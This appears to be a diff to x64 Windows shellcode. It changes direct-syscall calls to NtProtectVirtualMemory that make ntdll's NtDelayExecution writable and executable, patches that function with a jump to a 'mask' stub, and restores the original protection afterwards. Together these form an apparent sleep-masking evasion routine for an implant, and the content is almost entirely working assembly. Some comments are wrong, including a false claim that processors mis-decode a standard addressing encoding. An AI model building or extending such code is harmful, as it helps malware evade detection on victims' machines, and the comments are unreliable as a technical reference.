@@ -116,20 +116,36 @@ sym_base:
     mov [r12 + (data_nr_protect - sym_base)], rax
 
     ; ---- 5. NtProtectVirtualMemory(RWX) over the target ------------------
+    ;   NtProtectVirtualMemory(NULL, &prot_base, &prot_size, 0x40, &saved_old_prot)
+    ;   Windows x64 syscall ABI (direct `syscall`, not a `call`):
+    ;     arg0 = RCX mirrored into R10, arg1 = RDX, arg2 = R8, arg3 = R9,
+    ;     arg4 = [RSP+0x28]; RSP must be 16-byte aligned at the `syscall`.
     mov r10, [r12 + (saved_ntdelay - sym_base)]
     mov [r12 + (prot_base - sym_base)], r10
     mov dword [r12 + (prot_size - sym_base)], 12
-    mov r9, [r12 + (saved_old_prot - sym_base)]
-    lea rdx, [r12 + (prot_base - sym_base)]
-    lea r8, [r12 + (prot_size - sym_base)]
-    xor rcx, rcx
-    mov r9d, 0x40
-    sub rsp, 0x20
+    sub rsp, 0x38                    ; 16-align RSP; shadow [rsp+8..rsp+0x28), arg4 [rsp+0x28]
     lea r10, [r12 + (saved_old_prot - sym_base)]
-    mov [rsp + 0x20], r10
+    mov [rsp + 0x28], r10            ; arg4 = &saved_old_prot (OldProtect, out)
+    lea rdx, [r12 + (prot_base - sym_base)]   ; arg1 = BaseAddress*
+    lea r8,  [r12 + (prot_size - sym_base)]   ; arg2 = RegionSize*
+    mov r9d, 0x40                    ; arg3 = PAGE_EXECUTE_READWRITE
+    xor rcx, rcx                     ; arg0 = NULL (current process)
+    mov r10, rcx                     ; arg0 -> R10 (the kernel reads arg0 from R10)
     mov eax, [r12 + (data_nr_protect - sym_base)]
     syscall
-    add rsp, 0x20
+    add rsp, 0x38
+    test eax, eax                    ; NTSTATUS: bit31 set = error/fatal
+    jns .s6_patch                    ; success/warning -> go patch + mask
+    ; NtProtect failed: the text isn't RWX, so we can't safely patch it in
+    ; place. Fall back to a real (unmasked) NtDelayExecution so the wait still
+    ; happens -- "runs no matter what."
+    lea rdx, [r12 + (timeout_val - sym_base)]   ; arg1 = &Duration (250 ms, 100ns)
+    xor rcx, rcx                     ; arg0 = InState (0 = relative)
+    mov rax, [r12 + (saved_ntdelay - sym_base)]
+    call rax
+    mov qword [r12 + (done_flag - sym_base)], 1
+    jmp .exit
+.s6_patch:
 
     ; ---- 6. save + patch NtDelayExecution (12 bytes) --------------------
     mov r10, [r12 + (saved_ntdelay - sym_base)]
@@ -150,17 +166,20 @@ sym_base:
     mov rax, [r12 + (saved_ntdelay - sym_base)]
     call rax
 
-    ; ---- 8. restore protection, flag done ------------------------------
-    mov rdx, [r12 + (prot_base - sym_base)]
-    lea r8, [r12 + (prot_size - sym_base)]
-    xor rcx, rcx
-    mov r9d, 0x20
-    sub rsp, 0x20
+    ; ---- 8. restore protection (to the saved OldProtect), flag done ------
+    ;   Same ABI as step 5; arg3 = the original protection the kernel returned
+    ;   into saved_old_prot, so we restore exactly what was there.
+    sub rsp, 0x38                    ; 16-align RSP; arg4 slot at [rsp+0x28]
     lea r10, [r12 + (saved_old_prot - sym_base)]
-    mov [rsp + 0x20], r10
+    mov [rsp + 0x28], r10            ; arg4 = &saved_old_prot
+    lea rdx, [r12 + (prot_base - sym_base)]   ; arg1 = BaseAddress* (pointer, like step 5)
+    lea r8,  [r12 + (prot_size - sym_base)]   ; arg2 = RegionSize*
+    mov r9d, [r12 + (saved_old_prot - sym_base)]  ; arg3 = restore ORIGINAL prot
+    xor rcx, rcx                     ; arg0 = NULL
+    mov r10, rcx                     ; arg0 -> R10
     mov eax, [r12 + (data_nr_protect - sym_base)]
     syscall
-    add rsp, 0x20
+    add rsp, 0x38
 
     mov qword [r12 + (done_flag - sym_base)], 1
 
@@ -182,6 +201,15 @@ sym_base:
 ; KUSER_SHARED_DATA is mapped at 0x7FFE0000 on every x64 Windows;
 ; SystemTime (100ns since 1601) is at +0x14. No exports, no calls.
 .stub:
+    ; Self-contained: recompute the blob base. This stub is reached via the
+    ; patched `jmp rax` from ANY thread that calls NtDelayExecution during the
+    ; mask window, so r12 (the shellcode's base) is caller-dependent and may be
+    ; stale here. Recompute it with a call/pop so the stub is correct no matter
+    ; who entered it.
+    call stub_base_pop
+stub_base_pop:
+    pop r12
+    sub r12, (stub_base_pop - sym_base)      ; r12 = sym_base (the blob base)
     ; absolute clock load idiom: `mov eax,imm32` zero-extends into rax, then [rax].
     ; NOT `mov rax,[0x7FFE0014]` — nasm encodes that as 48 8B 04 25 ... (a redundant
     ; SIB form) which real Intel/AMD HW mis-decodes as `mov rax,[rsp]` + `sub eax,..`.
